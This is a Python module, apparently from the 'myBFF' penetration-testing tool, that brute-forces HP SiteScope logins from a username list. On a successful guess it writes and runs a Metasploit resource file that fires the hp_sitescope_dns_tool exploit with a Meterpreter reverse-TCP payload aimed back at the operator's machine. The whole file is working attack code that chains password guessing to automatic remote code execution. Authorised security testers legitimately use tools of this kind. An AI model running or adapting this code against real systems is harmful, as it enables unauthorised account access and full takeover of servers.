#! /usr/bin/python
# Created by Kirk Hayes (l0gan) @kirkphayes
# Part of myBFF
from requests import session
import requests
import re
from argparse import ArgumentParser
import os
import socket

class SiteScopeBrute():
    def connectTest(self, config, payload):
        with session() as c:
            requests.packages.urllib3.disable_warnings()
            resp1 = c.get(config["HOST"] + '/SiteScope/')
            cookie1 = resp1.cookies['JSESSIONID']
            cookies = dict(JSESSIONID=cookie1)
            c.headers.update({'Host': config["HOST"] + ':' + config["port"], 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Referer': config["HOST"] + '/SiteScope/servlet/Main', 'Accept-Language': 'en-US,en;q=0.5'})
            c.cookies.clear()
            cpost = c.post(config["HOST"] + '/SiteScope/j_security_check', cookies=cookies, data=payload, allow_redirects=True)
            m = re.search("Incorrect user name or password", cpost.text)
            if m:
                print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
            else:
                print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"] + ". Running Metasploit module now...")
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("gmail.com",80))
                locIP = s.getsockname()[0]
                s.close()
                msfrf = open('msfresource.rc', 'w')
                msfrf.write('use exploit/windows/http/hp_sitescope_dns_tool\n')
                msfrf.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
                msfrf.write('set RHOST ' + config["HOST"] + '\n')
                msfrf.write('set RPORT ' + config["port"] + '\n')
                msfrf.write('set SITE_SCOPE_USER ' + config["USERNAME"] + '\n')
                msfrf.write('set SITE_SCOPE_PASSWORD ' + config["PASSWORD"] + '\n')
                msfrf.write('set LHOST ' + locIP + '\n')
                msfrf.write('set ExitOnSession false\n')
                msfrf.write('exploit -j -z\n')
                msfrf.close()
                os.system("msfconsole -r msfresource.rc")
                os.system("rm msfresource.rc")
    def payload(self, config):
        if config["UserFile"]:
            lines = [line.rstrip('\n') for line in open(config["UserFile"])]
            for line in lines:
                config["USERNAME"] = line.strip('\n')
                payload = {
                    'j_username': config["USERNAME"],
                    'j_password': config["PASSWORD"]
                    }
                self.connectTest(config, payload)
        else:
            payload = {
                'j_username': config["USERNAME"],
                'j_password': config["PASSWORD"]
            }
            self.connectTest(config, payload)
